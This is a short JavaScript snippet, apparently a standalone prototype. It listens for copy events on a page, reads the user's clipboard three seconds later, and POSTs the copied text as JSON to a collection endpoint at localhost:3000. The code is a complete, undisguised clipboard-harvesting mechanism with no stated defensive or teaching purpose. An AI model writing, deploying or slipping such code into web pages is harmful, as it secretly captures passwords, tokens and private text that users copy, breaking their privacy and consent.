const copyListener = addEventListener('copy', (event) => {
    setTimeout(async() => await navigator.clipboard.readText()
.then((data) => {
    let xhr = new XMLHttpRequest();
    xhr.open("POST", "http://localhost:3000/data");
    xhr.setRequestHeader("Accept", "application/json");
    xhr.setRequestHeader("Content-Type", "application/json");
    let jsonData = {copy: data}
    xhr.send(JSON.stringify(jsonData));
}),3000);
});